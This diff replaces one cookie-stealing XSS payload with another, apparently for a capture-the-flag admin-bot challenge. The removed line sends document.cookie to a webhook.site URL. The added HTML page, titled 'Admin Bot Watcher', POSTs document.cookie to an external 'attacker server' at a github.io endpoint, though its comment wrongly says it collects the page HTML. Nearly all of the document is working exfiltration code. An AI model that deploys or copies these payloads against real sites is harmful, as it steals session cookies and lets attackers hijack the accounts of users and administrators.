@@ -1,4 +1,27 @@
-<script>
-// Send cookie to attacker-controlled server
-fetch('https://webhook.site/YOUR-UNIQUE-ID?p='+encodeURIComponent(document.cookie));
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Bot Watcher</title>
+</head>
+<body>
+  <h1>🕵️‍♂️ Admin Bot Watching...</h1>
+  <p>Sending page source to attacker server...</p>
+
+  <script>
+    // Replace with your logging endpoint
+    const LOG_URL = "https://fire-k.github.io/Pwn_bot/submit";
+
+    // Get full page HTML
+    const source = encodeURIComponent(document.cookie);
+
+    // Send it to attacker server
+    fetch(LOG_URL, {
+      method: 'POST',
+      body: JSON.stringify({ source }),
+      headers: { 'Content-Type': 'application/json' },
+      mode: 'cors'
+    });
+  </script>
+</body>
+</html>
